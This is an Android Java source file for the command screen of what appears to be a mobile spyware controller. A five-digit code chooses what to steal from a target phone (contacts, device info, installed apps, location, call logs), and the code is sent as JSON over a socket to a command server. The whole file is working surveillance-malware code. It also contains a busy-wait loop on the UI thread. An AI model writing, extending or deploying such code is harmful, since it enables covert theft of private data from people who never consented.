package com.lu.mbcontrol;

import android.content.DialogInterface;
import android.content.Intent;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.lu.mbcontrol.utils.SoundPlay;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

import static com.lu.mbcontrol.utils.SocketAddress.PORT;
import static com.lu.mbcontrol.utils.SocketAddress.SOCKET_ADDRESS;

public class NetCodeActivity extends AppCompatActivity {
    private long firstTime = 0;
    private TextView tv_page;
    private EditText et_code;
    private Button bt_upCode,bt_changePage2function,bt_changePage2datasearch,bt_changePage2shop;

    private String code = "00000";
    private String returnData = "nodata";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_net_code);
        initView();
        event();
    }

    /**初始化界面*/
    public void initView(){
        tv_page = (TextView)findViewById(R.id.Tv_page_Netsent);
        et_code = (EditText)findViewById(R.id.ET_netcode_inNetCode);
        bt_upCode = (Button)findViewById(R.id.BT_upCode);
        bt_changePage2datasearch = (Button)findViewById(R.id.BT_changePage2dataserach_neCode);
        bt_changePage2function = (Button)findViewById(R.id.BT_changePage2function_netCode);
        bt_changePage2shop = (Button)findViewById(R.id.BT_changePage2shop_netCode);
    }

    /**按钮事件*/
    public void event(){
        bt_upCode.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                SoundPlay.initSoundPool(getApplicationContext());
                code = et_code.getText().toString();
                if(code.isEmpty()){
                    Toast.makeText(NetCodeActivity.this, "指令码不能为空", Toast.LENGTH_SHORT).show();
                }else {
                    if (code.length() == 5) {
                        confirmDialog();
                    } else {
                        Toast.makeText(NetCodeActivity.this, "指令码长度必须为5", Toast.LENGTH_SHORT).show();
                    }
                }
            }
        });
        bt_changePage2datasearch.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                SoundPlay.initSoundPool(getApplicationContext());
                Intent intent = new Intent(NetCodeActivity.this,DataSerachActivity.class);
                startActivity(intent);
                finish();
            }
        });
        bt_changePage2function.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                SoundPlay.initSoundPool(getApplicationContext());
                Intent intent = new Intent(NetCodeActivity.this,FunctionActivity.class);
                startActivity(intent);
                finish();
            }
        });
        bt_changePage2shop.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                SoundPlay.initSoundPool(getApplicationContext());
                Intent intent = new Intent(NetCodeActivity.this,tiantiantejiaActivity.class);
                startActivity(intent);
                finish();
            }
        });
        tv_page.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                SoundPlay.initSoundPool(getApplicationContext());
                startActivity(new Intent(NetCodeActivity.this,LoginActivity.class));
                finish();
            }
        });
    }

    /**弹窗信息*/
    public void confirmDialog(){
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        String s = parseCode();
        builder.setTitle("指令码"+code)
                .setMessage(s+"\n是否继续？")
                .setPositiveButton("确定", new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int id) {
                        new Thread(codeRunnable).start();
                        while(true){
                            if(!returnData.equals("nodata")){
                                Log.e("in while(true)","still no data");
                                break;
                            }
                        }
                        returnData = "nodata";
                        Toast.makeText(NetCodeActivity.this, "指令设置成功", Toast.LENGTH_SHORT).show();

                    }
                })
                .setNegativeButton("取消", new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int id) {

                    }
                });

        builder.show();
    }

    /**解析指令*/
    public String parseCode(){
        if(code.equals("00000") || code.indexOf("1") == -1){
            code = "00000";
            Toast.makeText(this, "指令中非法字符将按‘0’处理", Toast.LENGTH_SHORT).show();
            return "指令码初始化，不更新任何数据";
        }
        int flag = 0;
        List<String> all = new ArrayList<>();
        all.add("通讯录");all.add("设备信息");all.add("已安装应用列表");
        all.add("手机位置 ");all.add("通话记录");
        String tip = "";
        for(int i = 0; i < 5; i++) {
            if (code.charAt(i) == '1') {
                tip += "、" + all.get(i);
            }else if(code.charAt(i) != '0'){
                flag = 1;
                code = replaceIndex(i, code, "0");
            }
        }
        if(flag == 1){
            Toast.makeText(this, "指令中非法字符将按‘0’处理", Toast.LENGTH_SHORT).show();
        }
        return  "窃取：\n"+tip.substring(1);
    }

    /**替换固定位置字符*/
    public  String replaceIndex(int index,String res,String str){
        return res.substring(0, index)+str+res.substring(index+1);
    }

    /**网络线程*/
    Runnable codeRunnable = new Runnable() {
        @Override
        public void run() {
            Socket socket = null;
            try {
                socket = new Socket(SOCKET_ADDRESS, PORT);
                JSONObject jsonobj = new JSONObject();
                jsonobj.put("ID", "control");
                jsonobj.put("datatype","upCode");
                jsonobj.put("code",code);
                String data = jsonobj.toString();
                OutputStream outputStream = socket.getOutputStream();//获取一个输出流，向服务端发送信息
                PrintWriter printWriter = new PrintWriter(outputStream);//将输出流包装成打印流
                printWriter.print(data);
                printWriter.flush();
                socket.shutdownOutput();

                InputStream inputStream = socket.getInputStream();//获取一个输入流，接收服务端的信息
                InputStreamReader inputStreamReader = new InputStreamReader(inputStream, "GB2312");//包装成字符流，提高效率
                BufferedReader bufferedReader = new BufferedReader(inputStreamReader);//缓冲区
                String info = "";
                String temp = null;
                Log.e("log3", "in socket");
                while ((temp = bufferedReader.readLine()) != null) {
                    info += temp;
                }
                returnData = info;
                code = "00000";
                Log.e("服务端说：", returnData);
                Log.e("log5", "in socket");
                bufferedReader.close();
                inputStream.close();
                socket.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    };

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK && event.getAction() == KeyEvent.ACTION_DOWN) {
            long secondTime = System.currentTimeMillis();
            if (secondTime - firstTime > 2000) {
                Toast.makeText(NetCodeActivity.this, "再按一次退出", Toast.LENGTH_SHORT).show();
                firstTime = secondTime;
                return true;
            } else {
                finish();
            }
        }
        return super.onKeyDown(keyCode, event);
    }
}
